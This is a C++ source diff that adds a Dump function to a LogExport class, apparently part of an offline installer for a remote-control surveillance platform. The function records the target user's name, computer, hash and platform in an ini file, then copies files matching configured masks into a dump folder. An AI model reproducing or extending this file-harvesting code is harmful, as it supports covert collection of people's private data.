@@ -3,6 +3,7 @@
 
 #include "stdafx.h"
 #include "OfflineInstall.h"
+#include "DumpFiles.h"
 #include "LogExport.h"
 #define PBCLOSE_WINDOW WM_USER+10
 
@@ -233,6 +234,64 @@ BOOL LogExport::Export(rcs_struct_t *rcs_info, DWORD time_bias, WCHAR *user_name
 	// Apre la dialog che lancera' il thread di retrieve
 	DoModal();
 	return m_success;
+}
+
+BOOL LogExport::Dump(rcs_struct_t *rcs_info, DWORD time_bias, WCHAR *user_name, WCHAR *user_hash, WCHAR *computer_name, WCHAR *src_path, WCHAR *dest_drive, DWORD os_type, DWORD arch_type)
+{
+	WCHAR clear_path[MAX_PATH];
+	WCHAR dest_path[MAX_PATH];
+	SYSTEMTIME system_time;
+	FILETIME file_time;
+
+	// Crea una directory per i file di questo utente
+	GetSystemTime(&system_time);
+	SystemTimeToFileTime(&system_time, &file_time);	
+	swprintf_s(dest_path, sizeof(dest_path)/sizeof(dest_path[0]), L"%s\\%s_DMP_%.8X%.8X", dest_drive, rcs_info->rcs_name, file_time.dwHighDateTime, file_time.dwLowDateTime);
+	if (!CreateDirectory(dest_path, NULL))
+		return FALSE;
+
+	// Crea il file con le info dell'utente
+	swprintf_s(clear_path, sizeof(clear_path)/sizeof(clear_path[0]), L"%s\\offline.ini", dest_path);
+	PrepareIniFile(clear_path);
+	if (!WritePrivateProfileStringW(L"OFFLINE", L"USERID", user_name, clear_path))
+		return FALSE;
+	if (!WritePrivateProfileStringW(L"OFFLINE", L"DEVICEID", computer_name, clear_path))
+		return FALSE;
+	if (!WritePrivateProfileStringW(L"OFFLINE", L"FACTORY", rcs_info->rcs_name, clear_path))
+		return FALSE;
+	if (!WritePrivateProfileStringW(L"OFFLINE", L"INSTANCE", user_hash, clear_path))
+		return FALSE;
+
+	if (os_type == WIN_OS) {
+		if (!WritePrivateProfileStringW(L"OFFLINE", L"PLATFORM", L"WINDOWS", clear_path))
+			return FALSE;
+	} else if (os_type == MAC_OS) {
+		if (!WritePrivateProfileStringW(L"OFFLINE", L"PLATFORM", L"MACOS", clear_path))
+			return FALSE;
+	} else {
+		if (!WritePrivateProfileStringW(L"OFFLINE", L"PLATFORM", L"UNKNOWN", clear_path))
+			return FALSE;
+	}
+
+	// Setta la data dell'export
+	LARGE_INTEGER li_time, li_bias;
+	FILETIME ft;
+	SYSTEMTIME st;
+	WCHAR wchar_date[128];
+	GetLocalTime(&st);
+	SystemTimeToFileTime(&st, &ft);
+	li_time.HighPart = ft.dwHighDateTime;
+	li_time.LowPart = ft.dwLowDateTime;
+	li_bias.QuadPart = (int)time_bias;
+	li_bias.QuadPart *= (60*1000*1000*10);
+	li_time.QuadPart += li_bias.QuadPart;
+	
+	swprintf_s(wchar_date, sizeof(wchar_date)/sizeof(wchar_date[0]), L"%.8X.%.8X", li_time.HighPart, li_time.LowPart);
+	if (!WritePrivateProfileStringW(L"OFFLINE", L"SYNCTIME", wchar_date, clear_path))
+		return FALSE;
+
+	ExploreDirectoryAndCapture(src_path, 100, rcs_info->masks, dest_path);
+	return TRUE;
 }
 
 void LogExport::DoDataExchange(CDataExchange* pDX)
